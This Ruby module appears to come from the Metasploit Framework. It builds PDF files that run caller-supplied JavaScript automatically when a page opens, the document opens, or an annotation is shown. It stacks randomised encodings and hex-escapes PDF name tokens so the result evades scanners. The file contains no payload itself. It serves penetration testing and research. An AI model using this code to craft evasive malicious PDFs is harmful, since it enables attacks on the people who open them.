# -*- coding: binary -*-

###
#
# This module provides methods for creating PDF files.
#
###

module Msf
module Exploit::PDF

  def initialize(info = {})
  super

  register_options(
    [
      OptBool.new('PDF::Obfuscate', [ true, 'Whether or not we should obfuscate the output', true ]),
      OptString.new('PDF::Method', [ true, 'Select PAGE, DOCUMENT, or ANNOTATION' , 'DOCUMENT']),
      OptString.new('PDF::Encoder', [ true, 'Select encoder for JavaScript Stream, valid values are ASCII85, FLATE, and ASCIIHEX', 'ASCIIHEX']),
      OptInt.new('PDF::MultiFilter', [ true, 'Stack multiple encodings n times', 1]),
    ], Msf::Exploit::PDF
  )

  # We're assuming we'll only create one pdf at a time here.
  @xref = {}
  @pdf = ''
  end

  ##
  #Original Filters
  ##

  def ascii_hex_whitespace_encode(str)
    return str if not datastore['PDF::Obfuscate']
    result = ""
    whitespace = ""
    str.each_byte do |b|
      result << whitespace << "%02x" % b
      whitespace = " " * (rand(3) + 1)
    end
    result << ">"
  end

  ##
  #Filters from Origami parser
  ##
  def run_length_encode(stream)
    eod = 128
    result = ""
    i = 0

    while i < stream.size
      #
      # How many identical bytes coming?
      #
      length = 1
      while i+1 < stream.size and length < eod and stream[i] == stream[i+1]
        length = length + 1
        i = i + 1
      end

      #
      # If more than 1, then compress them.
      #
      if length > 1
        result << (257 - length).chr << stream[i,1]

      #
      # Otherwise how many different bytes to copy ?
      #
      else
        j = i
        while j+1 < stream.size and (j - i + 1) < eod and stream[j] != stream[j+1]
          j = j + 1
        end

        length = j - i
        result << length.chr << stream[i, length+1]

        i = j
      end

      i = i + 1
    end
    result << eod.chr
  end

  def random_non_ascii_string(count)
    result = ""
    count.times do
      result << (rand(128) + 128).chr
    end
    result
  end

  def ascii85_encode(stream)
    eod = "~>"
    i = 0
    code = ""
    input = stream.dup

    while i < input.size do

      if input.length - i < 4
        addend = 4 - (input.length - i)
        input << "\0" * addend
      else
        addend = 0
      end

      inblock = (input[i].ord * 256**3 + input[i+1].ord * 256**2 + input[i+2].ord * 256 + input[i+3].ord)
      outblock = ""

      5.times do |p|
        c = inblock / 85 ** (4 - p)
        outblock << ("!"[0].ord + c).chr
        inblock -= c * 85 ** (4 - p)
      end

      outblock = "z" if outblock == "!!!!!" and addend == 0

      if addend != 0
        outblock = outblock[0,(4 - addend) + 1]
      end

      code << outblock
      i = i + 4
    end
    code << eod
  end

  # http://blog.didierstevens.com/2008/04/29/pdf-let-me-count-the-ways/
  def nobfu(str)
    return str if not datastore['PDF::Obfuscate']

    result = ""
    str.scan(/./u) do |c|
      if rand(2) == 0 and c.upcase >= 'A' and c.upcase <= 'Z'
        result << "#%x" % c.unpack("C*")[0]
      else
        result << c
      end
    end
    result
  end

  ##
  #PDF building block functions
  ##
  def header(version = '1.5')
    hdr = "%PDF-#{version}" << eol
    hdr << "%" << random_non_ascii_string(4) << eol
    hdr
  end

  def add_object(num, data)
    @xref[num] = @pdf.length
    @pdf << io_def(num)
    @pdf << data
    @pdf << endobj
  end

  def finish_pdf
    @xref_offset = @pdf.length
    @pdf << xref_table
    @pdf << trailer(1)
    @pdf << startxref
    @pdf
  end

  def xref_table
    id = @xref.keys.max+1
    ret = "xref" << eol
    ret << "0 %d" % id << eol
    ret << "0000000000 65535 f" << eol
    ret << (1..@xref.keys.max).map do |index|
      if @xref.has_key?(index)
        offset = @xref[index]
        "%010d 00000 n" % offset << eol
      else
        "0000000000 00000 f" << eol
      end
    end.join

    ret
  end

  def trailer(root_obj)
    ret = "trailer" << nobfu("<</Size %d/Root " % (@xref.length + 1)) << io_ref(root_obj) << ">>" << eol
    ret
  end

  def startxref
    ret = "startxref" << eol
    ret << @xref_offset.to_s << eol
    ret << "%%EOF" << eol
    ret
  end

  def eol
    @eol || "\x0d\x0a"
  end

  def eol=(new_eol)
    @eol = new_eol
  end

  def endobj
    "endobj" << eol
  end

  def io_def(id)
    "%d 0 obj" % id
  end

  def io_ref(id)
    "%d 0 R" % id
  end

  ##
  #Controller function, should be entrypoint for pdf exploits
  ##
  def create_pdf(js)
    strFilter = ""
    arrResults = []
    numIterations = 0
    arrEncodings = ['ASCII85','ASCIIHEX','FLATE','RUN']
    arrEncodings = arrEncodings.shuffle
    if datastore['PDF::MultiFilter'] < arrEncodings.length
      numIterations = datastore['PDF::MultiFilter']
    else
      numIterations = arrEncodings.length
    end
    for i in (0..numIterations-1)
      if i == 0
        arrResults = select_encoder(js,arrEncodings[i],strFilter)
        next
      end
      arrResults = select_encoder(arrResults[0],arrEncodings[i],arrResults[1])
    end
    case datastore['PDF::Method']
    when 'PAGE'
      pdf_with_page_exploit(arrResults[0],arrResults[1])
    when 'DOCUMENT'
      pdf_with_openaction_js(arrResults[0],arrResults[1])
    when 'ANNOTATION'
      pdf_with_annot_js(arrResults[0],arrResults[1])
    end
  end

  ##
  #Select an encoder and build a filter specification
  ##
  def select_encoder(js,strEncode,strFilter)
    case strEncode
    when 'ASCII85'
      js = ascii85_encode(js)
      strFilter = "/ASCII85Decode"<<strFilter
    when 'ASCIIHEX'
      js = ascii_hex_whitespace_encode(js)
      strFilter = "/ASCIIHexDecode"<<strFilter
    when 'FLATE'
      js = Zlib::Deflate.deflate(js)
      strFilter = "/FlateDecode"<<strFilter
    when 'RUN'
      js = run_length_encode(js)
      strFilter = "/RunLengthDecode"<<strFilter
    end
    return js,strFilter
  end

  ##
  #Create PDF with Page implant
  ##
  def pdf_with_page_exploit(js,strFilter)
    @xref = {}
    @pdf = ''

    @pdf << header
    add_object(1, nobfu("<</Type/Catalog/Outlines ") << io_ref(2) << nobfu("/Pages ") << io_ref(3) << ">>")
    add_object(2, nobfu("<</Type/Outlines/Count 0>>"))
    add_object(3, nobfu("<</Type/Pages/Kids[") << io_ref(4) << nobfu("]/Count 1>>"))
    add_object(4, nobfu("<</Type/Page/Parent ") << io_ref(3) << nobfu("/MediaBox[%s %s %s %s] " % [rand(200),rand(200),rand(300),rand(300)]) << nobfu(" /AA << /O << /JS ") << io_ref(5) << nobfu("/S /JavaScript >>>>>>"))
    compressed = js
    stream = "<</Length %s/Filter[" % compressed.length << strFilter << "]>>" << eol
    stream << "stream" << eol
    stream << compressed << eol
    stream << "endstream" << eol
    add_object(5, stream)

    finish_pdf
  end

  ##
  #Create PDF with OpenAction implant Note: doesn't carry over if
  # you try to merge the exploit PDF with an innocuous one
  ##
  def pdf_with_openaction_js(js,strFilter)
    @xref = {}
    @pdf = ''

    @pdf << header

    add_object(1, nobfu("<</Type/Catalog/Outlines ") << io_ref(2) << nobfu("/Pages ") << io_ref(3) << ">>")
    add_object(2, nobfu("<</Type/Outlines/Count 0>>"))
    add_object(3, nobfu("<</Type/Pages/Kids[") << io_ref(4) << nobfu("]/Count 1>>"))
    add_object(4, nobfu("<</Type/Page/Parent ") << io_ref(3) << nobfu("/MediaBox[%s %s %s %s] " % [rand(200),rand(200),rand(300),rand(300)]) << nobfu(" /AA << /O << /JS ") << io_ref(5) << nobfu("/S /JavaScript >>>>>>"))
    compressed = js
    stream = "<</Length %s/Filter[" % compressed.length << strFilter << "]>>" << eol
    stream << "stream" << eol
    stream << compressed << eol
    stream << "endstream" << eol
    add_object(5, stream)

    finish_pdf
  end

  ##
  #Create PDF with a malicious annotation
  ##
  def pdf_with_annot_js(js,strFilter)
    @xref = {}
    @pdf = ''

    @pdf << header

    add_object(1, nobfu("<</Type/Catalog/Outlines ") << io_ref(2) << nobfu("/Pages ") << io_ref(3) << ">>")
    add_object(2, nobfu("<</Type/Outlines/Count 0>>"))
    add_object(3, nobfu("<</Type/Pages/Kids[") << io_ref(4) << nobfu("]/Count 1>>"))
    add_object(4, nobfu("<</Type/Page/Parent ") << io_ref(3) << nobfu("/MediaBox[%s %s %s %s] " % [rand(200),rand(200),rand(300),rand(300)]) << nobfu(" /Annots [") << io_ref(5) << nobfu("]>>"))
    add_object(5, nobfu("<</Type/Annot /Subtype /Screen /Rect [%s %s %s %s] /AA << /PO << /JS " % [rand(200),rand(200),rand(300),rand(300)]) << io_ref(6) << nobfu("/S /JavaScript >>>>>>"))
    compressed = js
    stream = "<</Length %s/Filter[" % compressed.length << strFilter << "]>>" << eol
    stream << "stream" << eol
    stream << compressed << eol
    stream << "endstream" << eol
    add_object(6, stream)

    finish_pdf
  end

end
end
